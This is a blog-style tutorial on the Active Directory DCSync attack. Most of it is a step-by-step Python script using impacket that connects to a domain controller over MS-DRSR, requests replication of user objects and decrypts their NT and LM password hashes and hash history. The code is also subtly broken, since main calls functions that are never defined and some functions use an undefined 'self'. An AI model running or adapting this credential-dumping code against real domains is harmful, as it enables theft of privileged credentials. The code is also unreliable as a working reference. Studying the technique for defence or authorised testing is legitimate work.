---
title: "Deep Dive into DCSync"
categories: ["AD", "Active Directory"]
tags: ["ad", "actice directory", "dcsync"]     # TAG names should always be lowercase
toc: true
---

## Introduction
The DCSync attack is a technique used in Active Directory (AD) attacks, enabling attackers to retrieve password hashes for 
privileged accounts by impersonating a Domain Controller (DC). By exploiting Microsoft’s Directory Replication Service Remote Protocol (MS-DRSR), 
attackers can request sensitive user credentials, making it a preferred technique in post-exploitation scenarios.

<br>

In this blog post, we’ll dive deep into how DCSync attacks work by simulating the attack flow with a Python example.


## What is a DCSync Attack?
DCSync exploits Microsoft’s Directory Replication Service Remote Protocol (MS-DRSR). It lets an attacker obtain password hashes without 
needing direct access to the Domain Controller. Essentially, by impersonating a Domain Controller, attackers can request user credentials from other DCs in the domain.

DCSync leverages Microsoft’s Directory Replication Service Remote Protocol (MS-DRSR). Within an AD environment, Domain Controllers synchronize data such as user credentials and security settings. 
An attacker who gains specific replication permissions can exploit this by masquerading as a DC, making requests to retrieve password hashes for sensitive accounts like Domain Admins.

## Requirements

To executing the DCSync attack requires the following replication permissions on the target account:

 - Replicating Directory Changes
 - Replicating Directory Changes All
 - Replicating Directory Changes in Filtered Set



## Step-by-Step DCSync Attack

Common tools for DCSync include Mimikatz and Impacket. In this post I will demonstrate the process with a simplified Python script that utilizes impacket to extract solely the current user hashes from a domain controller.

### utils
```python
import argparse
from impacket.examples.utils import parse_target
from impacket.ldap.ldap import LDAPConnection, SimplePagedResultsControl, LDAPSessionError
from impacket.smbconnection import SMBConnection
from impacket.dcerpc.v5.dtypes import NULL, SID
from impacket.ldap.ldapasn1 import SearchResultEntry
from impacket.examples.secretsdump import RemoteOperations, NTDSHashes
from impacket.dcerpc.v5 import transport, rrp, scmr, wkst, samr, epm, drsuapi
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY, DCERPCException, RPC_C_AUTHN_GSS_NEGOTIATE
from impacket.uuid import string_to_bin
from impacket import LOG
from impacket import ntlm
import uuid
from binascii import unhexlify, hexlify
from struct import unpack, pack

class oids:
    ATTRTYP_TO_ATTID = {
            'name' : '1.2.840.113556.1.4.1',
            'sAMAccountName' : '1.2.840.113556.1.4.221',
            'userPrincipalName' : '1.2.840.113556.1.4.656',
            'sAMAccountType' : '1.2.840.113556.1.4.302',
            'userAccountControl' : '1.2.840.113556.1.4.8',
            'accountExpires' : '1.2.840.113556.1.4.159',
            'pwdLastSet' : '1.2.840.113556.1.4.96',
            'objectSid' : '1.2.840.113556.1.4.146',
            'sIDHistory' : '1.2.840.113556.1.4.609',
            'unicodedPwd' : '1.2.840.113556.1.4.90',
            'ntPwdHistory' : '1.2.840.113556.1.4.94',
            'dBCSPwd' : '1.2.840.113556.1.4.55',
            'lmPwdHistory' : '1.2.840.113556.1.4.160',
            'supplementalCredentials' : '1.2.840.113556.1.4.125',
            'msFVEKeyPackage' : '1.2.840.113556.1.4.1999',
            'msFVERecoveryGuid' : '1.2.840.113556.1.4.1965',
            'msFVEVolumeGuid' : '1.2.840.113556.1.4.1998',
            'msFVERecoveryPassword' : '1.2.840.113556.1.4.1964',
            'trustPartner' : '1.2.840.113556.1.4.133',
            'trustAuthIncoming' : '1.2.840.113556.1.4.129',
            'trustAuthOutgoing' : '1.2.840.113556.1.4.135',
            'currentValue': '1.2.840.113556.1.4.27',
            'isDeleted' : '1.2.840.113556.1.2.48'
    }


    def __init__(self):
        pass
```

### 0. Create a main function and argument parser
```python
def main():
    parser = argparse.ArgumentParser(description = "Performs a DCSync-Attack against a DC")

    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName')
    parser.add_argument('-users', action='store_true', help='DC-Sync User Accounts')
    parser.add_argument('-backupkey', action='store_true', help='DC-Sync DPAPI-Backupkey')


    group = parser.add_argument_group('authentication')
    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                             '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use'
                             ' the ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication'
                                                                            ' (128 or 256 bits)')



    options = parser.parse_args()
    domain, username, password, remoteName = parse_target(options.target)
    options.target_ip = remoteName
    options.dc_ip = remoteName
```

### 1. Initialize a DCSync Class
First of all, I initialize a DCSync class that handles the authentication and connections to the SMB and LDAP service on the domain controller. This is just boilerplate code copied from multiple impacket examples.
```python
class DumpSecrets:
    def __init__(self, remoteName, username='', password='', domain='', options=None):
        self.__remoteName = remoteName
        self.__remoteHost = options.target_ip
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__smbConnection = None
        self.__ldapConnection = None
        self.__NTDSHashes = None
        self.__noLMHash = True
        self.__isRemote = True
        self.__doKerberos = options.k
        self.__kdcHost = options.dc_ip
        self.__options = options
        self.__remoteOps = None
        self.__NTDSHashes = None
        self.__history = True
        self.__printUserStatus = None
        self.__pwdLastSet = None

        if options.hashes is not None:
            self.__lmhash, self.__nthash = options.hashes.split(':')
    def smbConnect(self):
        self.__smbConnection = SMBConnection(self.__remoteName, self.__remoteHost)
        if self.__doKerberos:
            self.__smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
                                               self.__nthash, self.__aesKey, self.__kdcHost)
        else:
            self.__smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)

    def ldapConnect(self):
        if self.__doKerberos:
            self.__target = self.__remoteHost
        else:
            if self.__kdcHost is not None:
                self.__target = self.__kdcHost
            else:
                self.__target = self.__domain

        # Create the baseDN
        if self.__domain:
            domainParts = self.__domain.split('.')
        else:
            domain = self.__target.split('.', 1)[-1]
            domainParts = domain.split('.')
        self.baseDN = ''
        for i in domainParts:
            self.baseDN += 'dc=%s,' % i
        # Remove last ','
        self.baseDN = self.baseDN[:-1]

        try:
            self.__ldapConnection = LDAPConnection('ldap://%s' % self.__target, self.baseDN, self.__kdcHost)
            if self.__doKerberos is not True:
                self.__ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
            else:
                self.__ldapConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                                                    self.__aesKey, kdcHost=self.__kdcHost)
        except LDAPSessionError as e:
            if str(e).find('strongerAuthRequired') >= 0:
                # We need to try SSL
                self.__ldapConnection = LDAPConnection('ldaps://%s' % self.__target, self.baseDN, self.__kdcHost)
                if self.__doKerberos is not True:
                    self.__ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
                else:
                    self.__ldapConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                                                        self.__aesKey, kdcHost=self.__kdcHost)
            else:
                raise
```

### 2. Get GUIDs from Users via LDAP

```python
def getUserGuids(dumper):
    dumper.ldapConnect()
    sc = SimplePagedResultsControl(size=100)
    resp = dumper._DumpSecrets__ldapConnection.search(searchFilter="(objectClass=user)", attributes=['msDS-PrincipalName','objectGuid'], sizeLimit=0, searchControls=[sc])

    dumper._DumpSecrets__ldapConnection.close()

    domainUsers = []
    for item in resp:
        if isinstance(item, SearchResultEntry):
            msDSPrincipalName = ''
            userGuid = ''
            try:
                for attribute in item['attributes']:
                    if str(attribute['type']) == 'msDS-PrincipalName':
                        msDSPrincipalName = attribute['vals'][0].asOctets().decode('utf-8')
                    if str(attribute['type']) == 'objectGUID':
                        GUID_bin = attribute['vals'][0].asOctets()
                        userGuid = str(uuid.UUID(bytes_le=GUID_bin))
                        
            except Exception as e:
                print("Exception", exc_info=True)
                print('Skipping item, cannot process due to error %s' % str(e))
                pass
            else:
                domainUsers.append([msDSPrincipalName, userGuid])

    return domainUsers
```

### 3. Connect to DRSUAPI RPC Interface ([MS-DRSR] Directory Replication Service)
```python
def connectDrds(dumper):
    stringBinding = epm.hept_map(dumper._DumpSecrets__smbConnection.getRemoteHost(), drsuapi.MSRPC_UUID_DRSUAPI,
                                 protocol='ncacn_ip_tcp')
    rpc = transport.DCERPCTransportFactory(stringBinding)
    rpc.setRemoteHost(dumper._DumpSecrets__smbConnection.getRemoteHost())
    rpc.setRemoteName(dumper._DumpSecrets__smbConnection.getRemoteName())
    if hasattr(rpc, 'set_credentials'):
        # This method exists only for selected protocol sequences.
        rpc.set_credentials(*(dumper._DumpSecrets__smbConnection.getCredentials()))
        rpc.set_kerberos(dumper._DumpSecrets__doKerberos, dumper._DumpSecrets__kdcHost)
    dumper._DumpSecrets__drsr = rpc.get_dce_rpc()
    dumper._DumpSecrets__drsr.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)


    if dumper._DumpSecrets__doKerberos:
        dumper._DumpSecrets__drsr.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
    dumper._DumpSecrets__drsr.connect()

    dumper._DumpSecrets__drsr.bind(drsuapi.MSRPC_UUID_DRSUAPI)

    dumper._DumpSecrets__domainName = rpc.get_credentials()[2]

    request = drsuapi.DRSBind()
    request['puuidClientDsa'] = drsuapi.NTDSAPI_CLIENT_GUID
    drs = drsuapi.DRS_EXTENSIONS_INT()
    drs['cb'] = len(drs) #- 4
    drs['dwFlags'] = drsuapi.DRS_EXT_GETCHGREQ_V6 | drsuapi.DRS_EXT_GETCHGREPLY_V6 | drsuapi.DRS_EXT_GETCHGREQ_V8 | \
                     drsuapi.DRS_EXT_STRONG_ENCRYPTION
    drs['SiteObjGuid'] = drsuapi.NULLGUID
    drs['Pid'] = 0
    drs['dwReplEpoch'] = 0
    drs['dwFlagsExt'] = 0
    drs['ConfigObjGUID'] = drsuapi.NULLGUID
    drs['dwExtCaps'] = 0xffffffff
    request['pextClient']['cb'] = len(drs)
    request['pextClient']['rgb'] = list(drs.getData())

    resp = dumper._DumpSecrets__drsr.request(request)

    # Let's dig into the answer to check the dwReplEpoch. This field should match the one we send as part of
    # DRSBind's DRS_EXTENSIONS_INT(). If not, it will fail later when trying to sync data.
    drsExtensionsInt = drsuapi.DRS_EXTENSIONS_INT()

    # If dwExtCaps is not included in the answer, let's just add it so we can unpack DRS_EXTENSIONS_INT right.
    ppextServer = b''.join(resp['ppextServer']['rgb']) + b'\x00' * (
    len(drsuapi.DRS_EXTENSIONS_INT()) - resp['ppextServer']['cb'])
    drsExtensionsInt.fromString(ppextServer)

    if drsExtensionsInt['dwReplEpoch'] != 0:
        # Different epoch, we have to call DRSBind again
        if LOG.level == logging.DEBUG:
            LOG.debug("DC's dwReplEpoch != 0, setting it to %d and calling DRSBind again" % drsExtensionsInt[
                'dwReplEpoch'])
        drs['dwReplEpoch'] = drsExtensionsInt['dwReplEpoch']
        request['pextClient']['cb'] = len(drs)
        request['pextClient']['rgb'] = list(drs.getData())
        resp = dumper._DumpSecrets__drsr.request(request)

    dumper._DumpSecrets__hDrs = resp['phDrs']

    # Now let's get the NtdsDsaObjectGuid UUID to use when querying NCChanges
    resp = drsuapi.hDRSDomainControllerInfo(dumper._DumpSecrets__drsr, dumper._DumpSecrets__hDrs, dumper._DumpSecrets__domainName, 2)

    if resp['pmsgOut']['V2']['cItems'] > 0:
        dumper._DumpSecrets__NtdsDsaObjectGuid = resp['pmsgOut']['V2']['rItems'][0]['NtdsDsaObjectGuid']
    else:
        print("Couldn't get DC info for domain %s" % dumper._DumpSecrets__domainName)
        raise Exception('Fatal, aborting')
```

## 4. Prepare DRSGetNCChanges Request
```python
def DRSGetNCChangesGuid(dumper, userGuid):
    dsName = drsuapi.DSNAME()
    dsName['SidLen'] = 0
    dsName['Guid'] = string_to_bin(userGuid)
    dsName['Sid'] = ''
    dsName['NameLen'] = 0
    dsName['StringName'] = ('\x00')
    dsName['structLen'] = len(dsName.getData())

    return DRSGetNCChanges(dumper, userGuid, dsName)
```

## 5. Perform DRSGetNCChanges Request
```python
def DRSGetNCChanges(dumper, userEntry, dsName):
    if dumper._DumpSecrets__drsr is None:
        dumper._DumpSecrets__connectDrds()

    LOG.debug('Calling DRSGetNCChanges for %s ' % userEntry)
    request = drsuapi.DRSGetNCChanges()
    request['hDrs'] = dumper._DumpSecrets__hDrs
    request['dwInVersion'] = 8

    request['pmsgIn']['tag'] = 8
    request['pmsgIn']['V8']['uuidDsaObjDest'] = dumper._DumpSecrets__NtdsDsaObjectGuid
    request['pmsgIn']['V8']['uuidInvocIdSrc'] = dumper._DumpSecrets__NtdsDsaObjectGuid

    request['pmsgIn']['V8']['pNC'] = dsName

    request['pmsgIn']['V8']['usnvecFrom']['usnHighObjUpdate'] = 0
    request['pmsgIn']['V8']['usnvecFrom']['usnHighPropUpdate'] = 0

    request['pmsgIn']['V8']['pUpToDateVecDest'] = NULL

    request['pmsgIn']['V8']['ulFlags'] =  drsuapi.DRS_INIT_SYNC | drsuapi.DRS_WRIT_REP
    request['pmsgIn']['V8']['cMaxObjects'] = 1
    request['pmsgIn']['V8']['cMaxBytes'] = 0
    request['pmsgIn']['V8']['ulExtendedOp'] = drsuapi.EXOP_REPL_OBJ

    dumper._DumpSecrets__ppartialAttrSet = None
    if dumper._DumpSecrets__ppartialAttrSet is None:
        dumper._DumpSecrets__prefixTable = []
        dumper._DumpSecrets__ppartialAttrSet = drsuapi.PARTIAL_ATTR_VECTOR_V1_EXT()
        dumper._DumpSecrets__ppartialAttrSet['dwVersion'] = 1
        dumper._DumpSecrets__ppartialAttrSet['cAttrs'] = len(NTDSHashes.ATTRTYP_TO_ATTID)
        for attId in list(NTDSHashes.ATTRTYP_TO_ATTID.values()):
            dumper._DumpSecrets__ppartialAttrSet['rgPartialAttr'].append(drsuapi.MakeAttid(dumper._DumpSecrets__prefixTable , attId))
    request['pmsgIn']['V8']['pPartialAttrSet'] = dumper._DumpSecrets__ppartialAttrSet
    request['pmsgIn']['V8']['PrefixTableDest']['PrefixCount'] = len(dumper._DumpSecrets__prefixTable)
    request['pmsgIn']['V8']['PrefixTableDest']['pPrefixEntry'] = dumper._DumpSecrets__prefixTable
    request['pmsgIn']['V8']['pPartialAttrSetEx1'] = NULL

    return dumper._DumpSecrets__drsr.request(request)
```

## 6. Decrypt DRSGetNCChanges Response
```python
def decryptHash(dumper, record, prefixTable=None, outputFile=None):
    replyVersion = 'V%d' %record['pdwOutVersion']
    LOG.debug('Decrypting hash for user: %s' % record['pmsgOut'][replyVersion]['pNC']['StringName'][:-1])
    domain = None
    if dumper._DumpSecrets__history:
        LMHistory = []
        NTHistory = []

    rid = unpack('<L', record['pmsgOut'][replyVersion]['pObjects']['Entinf']['pName']['Sid'][-4:])[0]

    for attr in record['pmsgOut'][replyVersion]['pObjects']['Entinf']['AttrBlock']['pAttr']:
        try:
            attId = drsuapi.OidFromAttid(prefixTable, attr['attrTyp'])
            LOOKUP_TABLE = NTDSHashes.ATTRTYP_TO_ATTID
        except Exception as e:
            LOG.debug('Failed to execute OidFromAttid with error %s, fallbacking to fixed table' % e)
            LOG.debug('Exception', exc_info=True)
            # Fallbacking to fixed table and hope for the best
            attId = attr['attrTyp']
            LOOKUP_TABLE = NTDSHashes.NAME_TO_ATTRTYP

        if attId == LOOKUP_TABLE['dBCSPwd']:
            if attr['AttrVal']['valCount'] > 0:
                encrypteddBCSPwd = b''.join(attr['AttrVal']['pAVal'][0]['pVal'])
                encryptedLMHash = drsuapi.DecryptAttributeValue(dumper._DumpSecrets__drsr, encrypteddBCSPwd)
                LMHash = drsuapi.removeDESLayer(encryptedLMHash, rid)
            else:
                LMHash = ntlm.LMOWFv1('', '')
        elif attId == LOOKUP_TABLE['unicodePwd']:
            if attr['AttrVal']['valCount'] > 0:
                encryptedUnicodePwd = b''.join(attr['AttrVal']['pAVal'][0]['pVal'])
                encryptedNTHash = drsuapi.DecryptAttributeValue(dumper._DumpSecrets__drsr, encryptedUnicodePwd)
                NTHash = drsuapi.removeDESLayer(encryptedNTHash, rid)
            else:
                NTHash = ntlm.NTOWFv1('', '')
        elif attId == LOOKUP_TABLE['userPrincipalName']:
            if attr['AttrVal']['valCount'] > 0:
                try:
                    domain = b''.join(attr['AttrVal']['pAVal'][0]['pVal']).decode('utf-16le').split('@')[-1]
                except:
                    domain = None
            else:
                domain = None
        elif attId == LOOKUP_TABLE['sAMAccountName']:
            if attr['AttrVal']['valCount'] > 0:
                try:
                    userName = b''.join(attr['AttrVal']['pAVal'][0]['pVal']).decode('utf-16le')
                except:
                    LOG.error('Cannot get sAMAccountName for %s' % record['pmsgOut'][replyVersion]['pNC']['StringName'][:-1])
                    userName = 'unknown'
            else:
                LOG.error('Cannot get sAMAccountName for %s' % record['pmsgOut'][replyVersion]['pNC']['StringName'][:-1])
                userName = 'unknown'
        elif attId == LOOKUP_TABLE['objectSid']:
            if attr['AttrVal']['valCount'] > 0:
                objectSid = b''.join(attr['AttrVal']['pAVal'][0]['pVal'])
            else:
                LOG.error('Cannot get objectSid for %s' % record['pmsgOut'][replyVersion]['pNC']['StringName'][:-1])
                objectSid = rid
        elif attId == LOOKUP_TABLE['pwdLastSet']:
            if attr['AttrVal']['valCount'] > 0:
                try:
                    pwdLastSet = self.__fileTimeToDateTime(unpack('<Q', b''.join(attr['AttrVal']['pAVal'][0]['pVal']))[0])
                except:
                    LOG.error('Cannot get pwdLastSet for %s' % record['pmsgOut'][replyVersion]['pNC']['StringName'][:-1])
                    pwdLastSet = 'N/A'
        elif dumper._DumpSecrets__printUserStatus and attId == LOOKUP_TABLE['userAccountControl']:
            if attr['AttrVal']['valCount'] > 0:
                if (unpack('<L', b''.join(attr['AttrVal']['pAVal'][0]['pVal']))[0]) & samr.UF_ACCOUNTDISABLE:
                    userAccountStatus = 'Disabled'
                else:
                    userAccountStatus = 'Enabled'
            else:
                userAccountStatus = 'N/A'

        if dumper._DumpSecrets__history:
            if attId == LOOKUP_TABLE['lmPwdHistory']:
                if attr['AttrVal']['valCount'] > 0:
                    encryptedLMHistory = b''.join(attr['AttrVal']['pAVal'][0]['pVal'])
                    tmpLMHistory = drsuapi.DecryptAttributeValue(dumper._DumpSecrets__drsr, encryptedLMHistory)
                    for i in range(0, len(tmpLMHistory) // 16):
                        LMHashHistory = drsuapi.removeDESLayer(tmpLMHistory[i * 16:(i + 1) * 16], rid)
                        LMHistory.append(LMHashHistory)
                else:
                    LOG.debug('No lmPwdHistory for user %s' % record['pmsgOut'][replyVersion]['pNC']['StringName'][:-1])
            elif attId == LOOKUP_TABLE['ntPwdHistory']:
                if attr['AttrVal']['valCount'] > 0:
                    encryptedNTHistory = b''.join(attr['AttrVal']['pAVal'][0]['pVal'])
                    tmpNTHistory = drsuapi.DecryptAttributeValue(dumper._DumpSecrets__drsr, encryptedNTHistory)
                    for i in range(0, len(tmpNTHistory) // 16):
                        NTHashHistory = drsuapi.removeDESLayer(tmpNTHistory[i * 16:(i + 1) * 16], rid)
                        NTHistory.append(NTHashHistory)
                else:
                    LOG.debug('No ntPwdHistory for user %s' % record['pmsgOut'][replyVersion]['pNC']['StringName'][:-1])

    if domain is not None:
        userName = '%s\\%s' % (domain, userName)

    answer = "%s:%s:%s:%s:::" % (userName, rid, hexlify(LMHash).decode('utf-8'), hexlify(NTHash).decode('utf-8'))
    if dumper._DumpSecrets__pwdLastSet is True:
        answer = "%s (pwdLastSet=%s)" % (answer, pwdLastSet)
    if dumper._DumpSecrets__printUserStatus is True:
        answer = "%s (status=%s)" % (answer, userAccountStatus)
    print(answer)

    if outputFile is not None:
        NTDSHashes.__writeOutput(outputFile, answer + '\n')

    if dumper._DumpSecrets__history:
        for i, (LMHashHistory, NTHashHistory) in enumerate(
                map(lambda l, n: (l, n) if l else ('', n), LMHistory[1:], NTHistory[1:])):
            if dumper._DumpSecrets__noLMHash:
                lmhash = hexlify(ntlm.LMOWFv1('', ''))
            else:
                lmhash = hexlify(LMHashHistory)

            answer = "%s_history%d:%s:%s:%s:::" % (userName, i, rid, lmhash.decode('utf-8'),
                                                   hexlify(NTHashHistory).decode('utf-8'))

            print(answer)
            if outputFile is not None:
                self.__writeOutput(outputFile, answer + '\n')
```

## 7. Adapt main function
```python
def main():
    parser = argparse.ArgumentParser(description = "Performs a DCSync-Attack against a DC")

    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName')


    group = parser.add_argument_group('authentication')
    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                             '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use'
                             ' the ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication'
                                                                            ' (128 or 256 bits)')



    options = parser.parse_args()
    domain, username, password, remoteName = parse_target(options.target)
    options.target_ip = remoteName
    options.dc_ip = remoteName

    dumper = DumpSecrets(remoteName, username, password, domain, options)


    # Connect to RPC with DRS Protocol
    dumper.connect()
    connectDrds(dumper)
    
    # DCSync the desired objects
    sync_users(dumper)

    # Close remaining connections
    disconnectLdap(dumper)
    disconnectSmb(dumper)
    disconnectDrds(dumper)
```
